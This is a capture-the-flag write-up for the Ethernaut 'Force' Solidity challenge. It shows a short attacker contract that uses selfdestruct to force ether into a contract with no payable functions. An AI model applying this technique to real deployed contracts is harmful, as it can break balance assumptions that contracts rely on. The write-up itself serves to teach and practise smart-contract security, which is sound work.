## Ethernaut Level 07 - Force - Write-Up
<!--Authors: OofedUp-->

Difficulty: 5/10

Objective: Send money to the contract

![image](https://i.imgur.com/O6Q5zNI.png)

## Source
```javascript
pragma solidity ^0.4.18;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

The task we get is very weird! In order to complete the challenge we need to send some ether to the contract. The problem is, it doesn't have a fallback function (it's an empty contract), so anyway we can try sending it money will fail. There is a way to do it though...

The `SELFDESTRUCT` opcode will destroy the contract, sending the remaining Ethereum to the address passed as a parameter. We can create a contract where we deposit some money, and call the self-destruct function to send money to the challenge contract.

Self-Destruct Contract:

```javascript
contract Hijack{
  address cc = INSTANCE_ADDRESS_HERE;
  function hackme() public payable{
      selfdestruct(cc);
    }

    function() payable{

    }
}
```

Deploying this contract with any amount of Ethereum will send it to the challenge contract:

![image](https://i.imgur.com/f5DaH6Y.png)

![image](https://i.imgur.com/TacwKew.png)

We successfully deposited Ethereum to a contract without triggering any functions!

![image](https://i.imgur.com/WjnGYnT.png)
